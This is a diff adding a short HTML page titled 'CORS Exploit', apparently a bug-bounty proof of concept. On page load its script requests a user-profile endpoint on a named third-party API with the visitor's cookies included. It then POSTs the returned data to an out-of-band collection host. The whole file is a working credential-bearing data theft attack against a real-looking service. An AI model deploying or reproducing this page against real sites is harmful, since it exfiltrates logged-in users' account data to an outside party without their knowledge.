@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS Exploit</title>
+</head>
+<body>
+    <h1>CORS Exploit</h1>
+    <script>
+        fetch('https://apiv2.partnermarketing.com/user/me', {
+            method: 'GET',
+            credentials: 'include',
+            headers: {
+                'Origin': 'https://nayssers.github.io'
+            }
+        })
+        .then(response => response.text())
+        .then(data => {
+            console.log('Response:', data);
+            fetch('https://pivmfpvbddwuickccewrjwstjg5xiimw2.oast.fun/collect', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({exfiltratedData: data})
+            });
+        })
+        .catch(error => console.error('Error:', error));
+    </script>
+</body>
+</html>
